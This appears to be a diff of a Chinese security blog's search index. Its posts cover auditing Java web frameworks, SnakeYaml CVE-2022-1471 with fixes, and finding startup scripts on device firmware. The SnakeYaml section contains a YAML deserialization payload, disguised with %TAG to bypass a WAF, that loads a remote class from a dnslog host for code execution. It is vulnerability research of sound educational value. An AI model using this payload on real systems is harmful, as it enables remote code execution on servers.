-<p>言归正传，我们重点是在庞杂的<code>jar</code>包中找到真正存放请求处理类的<code>jar</code>包，那么如何快速定位呢？我们知道<code>Spring Web</code>是通过前端控制器<code>DispatcherServlet</code>来进行请求的分发的，<br>在<code>DispatcherServlet</code>中方法<code>doDispatch</code>负责具体的分发逻辑，其中<code>DispatcherServlet this</code>对象的<code>handlerMappings</code> 属性存放的就是所有的注册的所有请求的处理对象，<br>当用户请求到来时将从这个<code>map</code>中取得对应的<code>handlerMapping</code>调用对应的方法对请求进行处理，故我们只需要遍历<code>handlerMappings</code>就可以找到<code>controlle</code>所在的位置了。具体的操作可能不太方便描述，<br>我们只需要逐级展开该对象获取器属性，然后找到带<code>controller</code>字样的属性然后鼠标右键选择<code>jump to type source</code>就可以跳转到类型的定义为止。当然我讲的这些都是在调试环境下进行的。<br><img src="/2025/04/10/JAVA%E7%94%9F%E6%80%81%E5%B8%B8%E8%A7%81%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E9%80%BB%E8%BE%91%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95/640.webp" referrerpolicy="no-referrer"></p>
-<h1 id="axis2"><a href="#axis2" class="headerlink" title="axis2"></a>axis2</h1><p>国内可能过分追求<code>spring</code>生态相关的东西，而对其它的技术运用不是特别广泛。我觉得<code>axis2</code>就算是一个，在国外的应用中你经常就能看到他们的身影，而在国内却很少见，<br>国内<code>java</code>程序员的传统艺能就是<code>spring framework    spring mvc spring boot   spring cloud spring security</code> 等。</p>
-<p><code>axis2</code>是<code>apache</code>开源的一个流行的<code>webservice</code>引擎，其可以方便地将<code>java</code>类发布为<code>service</code>，用户可以很容易地通过<code>http</code>请求调用到<code>java</code>类中定义的方法。</p>
-<p><code>axis2</code>通过<code>soap</code>协议来进行数据传输，发布一个<code>service</code>只需要编写一个<code>java</code>类，然后使用工具生成一个<code>wsdl</code>文件即可，一般在黑盒情况下要了解<code>service</code>可供使用的方法，<br>只需要在需要访问的<code>service</code>路径后加上参数<code>?wsdl</code>即可，当然这需要你能够读懂<code>wsdl</code>文件并且能够根据其构造出来对应的<code>soap</code>请求。</p>
-<p>嵌入式的<code>axis2</code>安装也是通过在<code>web.xml</code>中注册<code>servlet</code>实现的，寻找相关关键字就可以了，不过也没什么必要这里注册的内容只是告诉容器去解析<code>axis</code>而已，<br>具体与服务相关的东西还是要能够精准定位到<code>porttype</code>类与具体的<code>opration</code>才行，当然我们可以以<code>web.xml</code>中注册的<code>servlet</code>为突破口，找到对应的类打断点逐步调试也能找到对应的<code>service</code>类，<br>不过这需要你有足够的经验，能够根据方法名猜到其大致的功能以避免不必要的弯路。</p>
-<h1 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h1><p><code>rpc</code>与<code>restful</code>一样都是一套与信息交换有关的规范，用户往往接触到的是<code>restful</code>风格的<code>api</code>，而隐藏在<code>restful</code>后台与微服务，过程调用等相关的规范则往往是<code>rpc</code>。<br><code>grpc</code>是<code>google</code>的一套<code>rpc</code>规范，其采用<code>http/2</code>的方式进行信息交换，众所周知相比于<code>http/1.x http/2</code>采用字节流的方式发送数据，融合了多路复用、头部压缩等多种新兴技术具备更快的速度与可靠性。</p>
-<p>要实现一个<code>grpc</code>服务，首先我们需要按照<code>protobuf</code>的格式定义的<code>IDL</code>，即一个<code>.proto</code>后缀的文件，然后根据该文件使用工具编译生成与客户端请求处理相关的<code>stub</code>类，<br>以及与服务端方法定义相关的<code>ImplBase</code>类。我们通过实现<code>ImplBase</code>类通过覆写其方法类实现我们自己对外暴露的方法逻辑，然后客户端通过调用stub类同名方法来实现远程方法调用。</p>
-<p>当<code>grpc</code>与<code>spring boot</code>结合的时候对我们挖洞人来说往往是不友好的，<code>spring</code>通过注解进行自动装配的思想对于开发人员来说可能很方便，但对审计人员来说可真是难受，特别是分开打包+很多<code>jar</code>的情况。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>Java</tag>
-        <tag>jetty</tag>
-        <tag>axis2</tag>
-        <tag>struts2</tag>
       </tags>
   </entry>
   <entry>
@@ -1026,25 +1026,25 @@
 <p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
 <p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
 <p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193403071.png" referrerpolicy="no-referrer" alt="image-20230814193403071"></p>
+<p><img src="/image-20230814193403071.png" referrerpolicy="no-referrer" alt="image-20230814193403071"></p>
 <p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193503552.png" referrerpolicy="no-referrer" alt="image-20230814193503552"></p>
+<p><img src="/image-20230814193503552.png" referrerpolicy="no-referrer" alt="image-20230814193503552"></p>
 <p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
 <p>默认不允许使用全局tag</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194127911.png" referrerpolicy="no-referrer" alt="image-20230814194127911"></p>
+<p><img src="/image-20230814194127911.png" referrerpolicy="no-referrer" alt="image-20230814194127911"></p>
 <p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194330452.png" referrerpolicy="no-referrer" alt="image-20230814194330452"></p>
+<p><img src="/image-20230814194330452.png" referrerpolicy="no-referrer" alt="image-20230814194330452"></p>
 <p>重写isGlobalTagAllowed方法后的结果</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194609615.png" referrerpolicy="no-referrer" alt="image-20230814194609615"></p>
+<p><img src="/image-20230814194609615.png" referrerpolicy="no-referrer" alt="image-20230814194609615"></p>
 <p>远程类加载</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194851114.png" referrerpolicy="no-referrer" alt="image-20230814194851114"></p>
+<p><img src="/image-20230814194851114.png" referrerpolicy="no-referrer" alt="image-20230814194851114"></p>
 <p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
 <p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
 <p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
 
 <p>依旧RCE，还可以用来绕WAF</p>
-<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814195046711.png" referrerpolicy="no-referrer" alt="image-20230814195046711"></p>
+<p><img src="/image-20230814195046711.png" referrerpolicy="no-referrer" alt="image-20230814195046711"></p>
 <h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
 <li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
 <li>限制服务器出网</li>
@@ -1070,6 +1070,25 @@
         <tag>漏洞</tag>
         <tag>SnakeYaml</tag>
         <tag>CVE-2022-1471</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何快速在设备中查找程序启动脚本</title>
+    <url>/2025/04/10/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%9C%A8%E8%AE%BE%E5%A4%87%E4%B8%AD%E6%9F%A5%E6%89%BE%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<p>在拿到设备固件或者镜像文件后，若要进行更进一步的漏洞挖掘，我们便需要找到与当前设备功能相关联的软件的位置与启动方式等信息。<br>一般来讲如果只知道软件的位置便进行分析可能措施很多关键的信息，如：程序运行时设置的环境变量以及一些配置信息的设置。  </p>
+<span id="more"></span>
+
+<p>大多数情况下，程序在启动时并不是直接从elf文件启动，而是启动自shell脚本，同时为了能够让程序在每次重启系统或者开机时自动启动，<br>这些程序往往被注册成service可能被嵌入到一些其他在linux启动过程中会自动执行的脚本或者目录中。为了厘清在linux启动过程中究竟有哪些脚本被自动执行了，<br>我们首先需要对linux的启动过程有一个大概得了解。  </p>
+<p>在用户按下电源按钮启动系统是，首先发挥总用的是bios系统，启主要完成的功能包括POST，即开机自检，主要完成对系统的硬件进行检查等工作；<br>在bios系统完成其使命后期会通过其内部设置去尝试访问不同的存储介质尝试拉起系统，<br>在Windos下进行PE启动时我们往往会进入到bios选择操作系统的引导位置为USB就是这一过程的体现，一般情况下，操作系统的引导位置都是硬盘；<br>在堆硬盘进行访问时，首先会读取硬盘的主引导分区中的信息，住引导分区中存储着的便是我们通常所说的bootloader（拉着自己鞋带向上提），<br>bootloader一般包括两部分，一部分由汇编编写，主要完成一些依赖CPU体系的初始化工作，并调用第二部分代码，第二部分由C语言来实现，<br>常见的bootloader包括grub grub2 uboot等，我们在启动linux时通常会见到一个让我们选择系统内核版本的界面，该界面就是bootloader在起作用；<br>在bootloader将操作系统内核加载到内存中后将开始运行操作系统的第一个程序，在最新版本的linux中通常是systemd程序而在较低版本中可能是init；<br>之后会选择系统的运行级别runlevel，在此过程中会加载运行一些etcrc.d目录下的脚本运行；再之后便会进入到用户登录选项了，<br>在用户输入正确的用户名密码登录后会加载etcprofile - etcprofile.d.sh -~.bash_profile - ~.bashrc - etcbashrc等文件初始化环境变量。  </p>
+<p>在linux启动过程中凡是涉及到自动脚本执行的地方都有可能被修改插入设备程序启动脚本的地方，在查找时可以逐一排查。<br>不过，一般情况下更普遍的做法是将程序的启动过程注册为service。linux系统中的service可以通过命令systemctl 查看，<br>找到我们感兴趣的服务然后执行systemctl show service_name便可以查看与该服务相关的信息，我们可以从中找到服务的存储位置，<br>如：etcsystemdsystemdefault.target.wants.service  usrlibsystemdsystem.service  查看对应的service文件我们便可以找到相关的启动脚本所在位置，<br>然后通过阅读启动脚本了解程序启动过程中设置的环境变量、配置、启动参数等信息。  </p>
+<p>除了这种追本溯源的方式，还有一种更加简单直接的方式，我们可以通过查进程的方式找到相关得信息。比如我们要找一个java程序，<br>可以直接执行ps -ef  grep java  便可以找到相关的程序的启动命令。如果只知道启动的端口，我们可以先执行netstat -tulnp查看到对应的PID信息，<br>然后通过PID使用命令ps命令也可以。  </p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏挖技巧</tag>
       </tags>
   </entry>
   <entry>
@@ -1167,25 +1186,6 @@
         <tag>WebFlux Security</tag>
         <tag>CVE-2023-34034</tag>
         <tag>认证绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何快速在设备中查找程序启动脚本</title>
-    <url>/2025/04/10/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%9C%A8%E8%AE%BE%E5%A4%87%E4%B8%AD%E6%9F%A5%E6%89%BE%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<p>在拿到设备固件或者镜像文件后，若要进行更进一步的漏洞挖掘，我们便需要找到与当前设备功能相关联的软件的位置与启动方式等信息。<br>一般来讲如果只知道软件的位置便进行分析可能措施很多关键的信息，如：程序运行时设置的环境变量以及一些配置信息的设置。  </p>
-<span id="more"></span>
-
-<p>大多数情况下，程序在启动时并不是直接从elf文件启动，而是启动自shell脚本，同时为了能够让程序在每次重启系统或者开机时自动启动，<br>这些程序往往被注册成service可能被嵌入到一些其他在linux启动过程中会自动执行的脚本或者目录中。为了厘清在linux启动过程中究竟有哪些脚本被自动执行了，<br>我们首先需要对linux的启动过程有一个大概得了解。  </p>
-<p>在用户按下电源按钮启动系统是，首先发挥总用的是bios系统，启主要完成的功能包括POST，即开机自检，主要完成对系统的硬件进行检查等工作；<br>在bios系统完成其使命后期会通过其内部设置去尝试访问不同的存储介质尝试拉起系统，<br>在Windos下进行PE启动时我们往往会进入到bios选择操作系统的引导位置为USB就是这一过程的体现，一般情况下，操作系统的引导位置都是硬盘；<br>在堆硬盘进行访问时，首先会读取硬盘的主引导分区中的信息，住引导分区中存储着的便是我们通常所说的bootloader（拉着自己鞋带向上提），<br>bootloader一般包括两部分，一部分由汇编编写，主要完成一些依赖CPU体系的初始化工作，并调用第二部分代码，第二部分由C语言来实现，<br>常见的bootloader包括grub grub2 uboot等，我们在启动linux时通常会见到一个让我们选择系统内核版本的界面，该界面就是bootloader在起作用；<br>在bootloader将操作系统内核加载到内存中后将开始运行操作系统的第一个程序，在最新版本的linux中通常是systemd程序而在较低版本中可能是init；<br>之后会选择系统的运行级别runlevel，在此过程中会加载运行一些etcrc.d目录下的脚本运行；再之后便会进入到用户登录选项了，<br>在用户输入正确的用户名密码登录后会加载etcprofile - etcprofile.d.sh -~.bash_profile - ~.bashrc - etcbashrc等文件初始化环境变量。  </p>
-<p>在linux启动过程中凡是涉及到自动脚本执行的地方都有可能被修改插入设备程序启动脚本的地方，在查找时可以逐一排查。<br>不过，一般情况下更普遍的做法是将程序的启动过程注册为service。linux系统中的service可以通过命令systemctl 查看，<br>找到我们感兴趣的服务然后执行systemctl show service_name便可以查看与该服务相关的信息，我们可以从中找到服务的存储位置，<br>如：etcsystemdsystemdefault.target.wants.service  usrlibsystemdsystem.service  查看对应的service文件我们便可以找到相关的启动脚本所在位置，<br>然后通过阅读启动脚本了解程序启动过程中设置的环境变量、配置、启动参数等信息。  </p>
-<p>除了这种追本溯源的方式，还有一种更加简单直接的方式，我们可以通过查进程的方式找到相关得信息。比如我们要找一个java程序，<br>可以直接执行ps -ef  grep java  便可以找到相关的程序的启动命令。如果只知道启动的端口，我们可以先执行netstat -tulnp查看到对应的PID信息，<br>然后通过PID使用命令ps命令也可以。  </p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>漏挖技巧</tag>
       </tags>
   </entry>
   <entry>
